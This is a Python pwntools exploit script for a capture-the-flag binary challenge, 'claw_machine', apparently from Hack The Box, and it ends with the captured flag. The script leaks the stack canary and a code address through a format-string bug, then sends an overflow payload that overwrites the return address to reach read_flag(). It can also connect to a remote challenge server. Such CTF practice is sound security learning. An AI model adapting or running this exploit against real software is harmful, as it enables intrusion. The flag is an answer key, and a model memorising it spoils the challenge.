#!/usr/bin/env python3
from pwn import *

""" Format string to leak stack cookie and base address, then ret2win """

exe = context.binary = ELF(args.EXE or 'claw_machine')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("94.237.48.48", 59798) 
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak fb
continue
'''.format(**locals())


### leak stack canary with format string
# canary stored at rbp-0x8

io = start()
io.recvuntil(b'>> ')
io.sendline(b'9')

io.recvuntil(b'>> ')
io.sendline(b'y')

io.recvuntil(b"your name: ")
fmt = b"%21$p.%23$pEND"
io.sendline(fmt)

leak = io.recvuntil(b"END")
leak = leak[:-3]
canary, second_addr = leak.split(b'.')
canary = canary.split()[5]
log.info(f"Leaked canary: {canary}")
log.info(f"Leaked exe address: {second_addr}")
canary = p64(int(canary, 16))

# leaked exe address is for main. Subtract offset of the read_flag() func to get there
second_addr = p64(int(second_addr, 16) - 2510)

# put canary in payload, then ret to read_flag() to win 
payload = b"A"*72 + canary + b"B"*8 + second_addr

io.recvuntil(b"feedback here: ")
io.sendline(payload)

io.interactive()

# HTB{gr4b_th3_fl4g_w1th_fmt}  
